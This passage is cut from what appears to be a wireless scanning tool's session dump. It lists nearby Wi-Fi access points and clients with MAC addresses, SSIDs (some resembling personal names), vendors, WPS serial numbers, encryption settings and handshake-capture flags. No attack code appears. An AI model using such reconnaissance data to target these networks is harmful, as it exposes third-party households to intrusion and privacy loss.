                'meta': {
                    'values': {}
                },
                'frequency': 5785,
                'channel': 157,
                'rssi': -81,
                'sent': 288,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:5e:42:b6:8b:17',
            'hostname': 'Jeffd275',
            'alias': '',
            'vendor': 'Technicolor CH USA Inc.',
            'first_seen': '2022-02-12T21:20:32.276073432Z',
            'last_seen': '2022-02-12T22:31:37.75259552Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -78,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Display',
                'Device Name': 'Xfinity Wireless Gateway',
                'Manufacturer': 'Technicolor',
                'Model Name': 'XB7',
                'Model Number': 'CGM4331COM',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '1234',
                'State': 'Configured',
                'UUID-E': '11595c8a106894cdbf63e3060410a40d',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '68:72:51:80:52:1c',
            'hostname': 'BLAIR32738',
            'alias': '',
            'vendor': 'Ubiquiti Networks Inc.',
            'first_seen': '2022-02-12T20:23:32.267085437Z',
            'last_seen': '2022-02-12T22:32:42.255018758Z',
            'meta': {
                'values': {}
            },
            'frequency': 2427,
            'channel': 4,
            'rssi': -84,
            'sent': 2293,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f6:a0:97:45:c9:6a',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:44.527806182Z',
            'last_seen': '2022-02-12T22:32:18.191489136Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -83,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '4c:12:65:57:c9:26',
            'hostname': 'R.dogs= available 4 dinner',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:24:05.008657474Z',
            'last_seen': '2022-02-12T22:32:39.184121145Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -76,
            'sent': 22793,
            'received': 400,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'Reference Design',
                'Manufacturer': 'Quantenna',
                'Model Name': 'pearl',
                'Model Number': 'QSR10GA.560',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '5CB066041912',
                'State': 'Configured',
                'UUID-E': 'd888ef60efa95b1898703c79d4808460',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '4c:12:65:57:c9:26',
                'hostname': '',
                'alias': '',
                'vendor': 'ARRIS Group, Inc.',
                'first_seen': '2022-02-12T22:32:03.855428316Z',
                'last_seen': '2022-02-12T22:32:03.855428316Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2412,
                'channel': 1,
                'rssi': -76,
                'sent': 0,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '7e:7a:8a:3b:cf:d0',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.484538705Z',
            'last_seen': '2022-02-12T22:32:39.183357397Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -23,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '8e:49:62:f1:02:f3',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:10:53.585731799Z',
            'last_seen': '2022-02-12T22:32:39.184702007Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Device Name': 'Fuck you',
                'Primary Device Type': 'TV (oui:0050f204)',
                'State': 'Configured',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:48:e6:73',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.68574547Z',
            'last_seen': '2022-02-12T22:32:13.071874691Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -75,
            'sent': 3350,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '1a:a0:97:af:d1:40',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:36:13.330715999Z',
            'last_seen': '2022-02-12T22:32:07.961206658Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '3a:a0:97:af:d1:40',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:18:01.753634481Z',
            'last_seen': '2022-02-12T22:32:07.961880722Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a8:5e:45:af:e6:d0',
            'hostname': 'home_net',
            'alias': '',
            'vendor': 'ASUSTek COMPUTER INC.',
            'first_seen': '2022-02-12T20:23:34.805871807Z',
            'last_seen': '2022-02-12T22:32:42.769207834Z',
            'meta': {
                'values': {}
            },
            'frequency': 2442,
            'channel': 7,
            'rssi': -62,
            'sent': 126028,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ae:70:5d:b8:e6:10',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:44.526981492Z',
            'last_seen': '2022-02-12T22:32:17.88038018Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -84,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'b6:70:5d:b8:e6:0f',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:33.77705713Z',
            'last_seen': '2022-02-12T22:32:42.771141269Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -73,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ac:3a:7a:0f:fc:1b',
            'hostname': '',
            'alias': '',
            'vendor': 'Roku, Inc.',
            'first_seen': '2022-02-12T22:25:05.137890439Z',
            'last_seen': '2022-02-12T22:28:01.681210576Z',
            'meta': {
                'values': {}
            },
            'frequency': 2442,
            'channel': 7,
            'rssi': -81,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Device Name': 'DIRECT-roku-794',
                'Primary Device Type': 'AP (oui:0050f204)',
                'State': 'Configured',
                'UUID-E': '22210203040506070809ac3a7a0ffc1b',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5c:a5:bc:2c:1b:27',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': 'eero inc.',
            'first_seen': '2022-02-12T22:06:15.572341491Z',
            'last_seen': '2022-02-12T22:31:33.135407804Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -75,
            'sent': 0,
            'received': 0,
            'encryption': 'OPEN',
            'cipher': '',
            'authentication': '',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:48:e6:71',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:29.684753487Z',
            'last_seen': '2022-02-12T22:32:13.071823951Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -75,
            'sent': 4884,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '4e:12:65:57:c9:26',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:57:54.831503858Z',
            'last_seen': '2022-02-12T22:32:39.184071479Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -74,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'be:34:26:38:d3:3c',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:45:20.400433044Z',
            'last_seen': '2022-02-12T22:31:37.749678045Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f2:79:0a:3b:42:76',
            'hostname': 'XFINITY',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:45.042339926Z',
            'last_seen': '2022-02-12T22:32:19.21630961Z',
            'meta': {
                'values': {}
            },
            'frequency': 5240,
            'channel': 48,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ee:a0:97:45:c9:69',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.907484901Z',
            'last_seen': '2022-02-12T22:32:13.070929205Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -80,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ba:d5:9d:55:1a:4d',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:31:28.018974937Z',
            'last_seen': '2022-02-12T22:31:28.018974937Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -81,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '68:d7:9a:c1:77:21',
            'hostname': 'Home',
            'alias': '',
            'vendor': 'Ubiquiti Networks Inc.',
            'first_seen': '2022-02-12T20:23:29.484864662Z',
            'last_seen': '2022-02-12T22:32:39.184287532Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -26,
            'sent': 16943,
            'received': 256,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:5e:42:42:9e:3b',
            'hostname': 'kitkat 2.',
            'alias': '',
            'vendor': 'Technicolor CH USA Inc.',
            'first_seen': '2022-02-12T20:23:33.778024002Z',
            'last_seen': '2022-02-12T22:32:42.76942222Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -76,
            'sent': 175134,
            'received': 81729,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Display',
                'Device Name': 'Xfinity Wireless Gateway',
                'Manufacturer': 'Technicolor',
                'Model Name': 'XB7',
                'Model Number': 'CGM4331COM',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz, 5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '1234',
                'State': 'Configured',
                'UUID-E': '53eb8665f1f16fb2858b1e3df15bd6c0',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '38:01:46:d4:72:81',
                'hostname': '',
                'alias': '',
                'vendor': 'Shenzhen Bilian Electronic Co.ï¼Ltd',
                'first_seen': '2022-02-12T22:29:46.126658148Z',
                'last_seen': '2022-02-12T22:32:42.769631458Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -80,
                'sent': 144,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }, {
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': 'c0:d2:f3:ba:75:51',
                'hostname': '',
                'alias': '',
                'vendor': 'Hui Zhou Gaoshengda Technology Co.,LTD',
                'first_seen': '2022-02-12T22:28:00.663838772Z',
                'last_seen': '2022-02-12T22:28:00.663838772Z',
                'meta': {
                    'values': {}
                },
                'frequency': 2437,
                'channel': 6,
                'rssi': -79,
                'sent': 50,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '38:2c:4a:a4:d1:c9',
            'hostname': 'home_net',
            'alias': '',
            'vendor': 'ASUSTek COMPUTER INC.',
            'first_seen': '2022-02-12T20:23:34.806132561Z',
            'last_seen': '2022-02-12T22:32:42.768734637Z',
            'meta': {
                'values': {}
            },
            'frequency': 2442,
            'channel': 7,
            'rssi': -67,
            'sent': 187428,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'de:34:26:38:d3:3c',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:28:40.079229392Z',
            'last_seen': '2022-02-12T22:32:12.560782834Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '6e:d7:9a:c2:77:21',
            'hostname': 'Home',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:00.912642575Z',
            'last_seen': '2022-02-12T22:32:35.087959957Z',
            'meta': {
                'values': {}
            },
            'frequency': 5765,
            'channel': 153,
            'rssi': -29,
            'sent': 32769,
            'received': 5746,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [{
                'ipv4': '0.0.0.0',
                'ipv6': '',
                'mac': '7c:d5:66:f7:1c:40',
                'hostname': '',
                'alias': '',
                'vendor': 'Amazon Technologies Inc.',
                'first_seen': '2022-02-12T22:27:16.110976423Z',
                'last_seen': '2022-02-12T22:30:51.150750083Z',
                'meta': {
                    'values': {}
                },
                'frequency': 5805,
                'channel': 153,
                'rssi': -59,
                'sent': 252,
                'received': 0,
                'encryption': '',
                'cipher': '',
                'authentication': '',
                'wps': {}
            }],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'aa:d5:9d:55:1a:4d',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T22:31:28.608974083Z',
            'last_seen': '2022-02-12T22:31:28.608974083Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -82,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '3c:7a:8a:3b:cf:d6',
            'hostname': 'Home',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:42.488540618Z',
            'last_seen': '2022-02-12T22:32:16.976332887Z',
            'meta': {
                'values': {}
            },
            'frequency': 5180,
            'channel': 36,
            'rssi': -33,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Label',
                'Device Name': 'AtherosAP',
                'Manufacturer': 'Atheros Communications, Inc.',
                'Model Name': 'APxx',
                'Model Number': 'APxx-xxx',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': 'Serial Number Here',
                'State': 'Configured',
                'UUID-E': '5f1552dc4bad5c069075dd34ff85f366',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'c6:3f:cb:db:0d:9a',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:01.936609098Z',
            'last_seen': '2022-02-12T22:32:36.11236229Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '46:12:65:57:c9:26',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:29:05.807749162Z',
            'last_seen': '2022-02-12T22:32:39.184500362Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'fa:5e:42:43:9e:38',
            'hostname': '',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:33.777645101Z',
            'last_seen': '2022-02-12T22:32:42.769367795Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -76,
            'sent': 12638,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'd6:3f:cb:db:0d:9a',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:01.939105852Z',
            'last_seen': '2022-02-12T22:32:36.111982036Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -76,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '38:a0:67:35:f2:b3',
            'hostname': 'Allmine',
            'alias': '',
            'vendor': 'Nokia Solutions and Networks GmbH & Co. KG',
            'first_seen': '2022-02-12T20:23:29.485860108Z',
            'last_seen': '2022-02-12T22:32:39.183749873Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -77,
            'sent': 5430,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '7e:e3:0e:c9:56:b3',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T21:39:09.465681405Z',
            'last_seen': '2022-02-12T22:32:08.465977112Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '5a:19:f8:f6:56:23',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.896255672Z',
            'last_seen': '2022-02-12T22:32:12.562378348Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -74,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '22:f5:43:26:81:8e',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:02.446608059Z',
            'last_seen': '2022-02-12T22:32:36.111722392Z',
            'meta': {
                'values': {}
            },
            'frequency': 5785,
            'channel': 157,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Device Name': 'TCL Roku TV - 700',
                'Primary Device Type': 'TV (oui:0050f204)',
                'State': 'Configured',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '6e:d7:9a:c1:77:21',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:24:04.49558525Z',
            'last_seen': '2022-02-12T22:32:39.184239144Z',
            'meta': {
                'values': {}
            },
            'frequency': 2412,
            'channel': 1,
            'rssi': -27,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '9c:34:26:38:d3:3c',
            'hostname': 'BrendaWatkins',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:45:20.40328887Z',
            'last_seen': '2022-02-12T22:31:37.750737196Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -78,
            'sent': 232,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': 'Label',
                'Device Name': 'AtherosAP',
                'Manufacturer': 'Atheros Communications, Inc.',
                'Model Name': 'APxx',
                'Model Number': 'APxx-xxx',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': 'Serial Number Here',
                'State': 'Configured',
                'UUID-E': 'a10c90db979d5a12bf09a8ce60aa52b2',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'a6:70:5d:b8:e6:0f',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:39:22.521172663Z',
            'last_seen': '2022-02-12T22:32:42.770466464Z',
            'meta': {
                'values': {}
            },
            'frequency': 2437,
            'channel': 6,
            'rssi': -73,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ee:79:0a:3b:42:76',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:45.041815028Z',
            'last_seen': '2022-02-12T22:32:19.216031948Z',
            'meta': {
                'values': {}
            },
            'frequency': 5240,
            'channel': 48,
            'rssi': -79,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'ce:3f:cb:db:0d:99',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.901805093Z',
            'last_seen': '2022-02-12T22:32:13.071770859Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -60,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '9a:19:f8:f6:56:23',
            'hostname': '<hidden>',
            'alias': '',
            'vendor': '',
            'first_seen': '2022-02-12T20:23:38.902201475Z',
            'last_seen': '2022-02-12T22:32:12.561722728Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -77,
            'sent': 0,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'TKIP',
            'authentication': 'MGT',
            'wps': {},
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'f8:a0:97:45:c9:6a',
            'hostname': 'The Bitch of the house',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T21:45:47.279109906Z',
            'last_seen': '2022-02-12T22:32:18.192275273Z',
            'meta': {
                'values': {}
            },
            'frequency': 5220,
            'channel': 44,
            'rssi': -85,
            'sent': 1849,
            'received': 0,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'Config Methods': '0000',
                'Device Name': 'Reference Design',
                'Manufacturer': 'Quantenna',
                'Model Name': 'pearl',
                'Model Number': 'QSR10GA.560',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '5.0Ghz',
                'Response Type': 'AP',
                'Serial Number': '5CB066041913',
                'State': 'Configured',
                'UUID-E': '2d3fedef786c5f26b3b3922964c79a48',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': 'd4:3f:cb:db:0d:99',
            'hostname': 'Calvin91',
            'alias': '',
            'vendor': 'ARRIS Group, Inc.',
            'first_seen': '2022-02-12T20:23:38.89758963Z',
            'last_seen': '2022-02-12T22:32:12.561661877Z',
            'meta': {
                'values': {}
            },
            'frequency': 2462,
            'channel': 11,
            'rssi': -60,
            'sent': 2983,
            'received': 60,
            'encryption': 'WPA2',
            'cipher': 'CCMP',
            'authentication': 'PSK',
            'wps': {
                'AP Setup Locked': '01',
                'Config Methods': 'Label, Display',
                'Device Name': 'Reference Design',
                'Manufacturer': 'Quantenna',
                'Model Name': 'pearl',
                'Model Number': 'QSR10GA.560',
                'Primary Device Type': 'AP (oui:0050f204)',
                'RF Bands': '2.4Ghz',
                'Response Type': 'AP',
                'Serial Number': '5CB066041912',
                'State': 'Configured',
                'UUID-E': 'ebfa96d96f1155839519aba6e0e0778b',
                'Vendor Extension': '00372a000120',
                'Version': '2.0'
            },
            'clients': [],
            'handshake': False
        }, {
            'ipv4': '0.0.0.0',
            'ipv6': '',
            'mac': '88:71:b1:b1:fb:79',
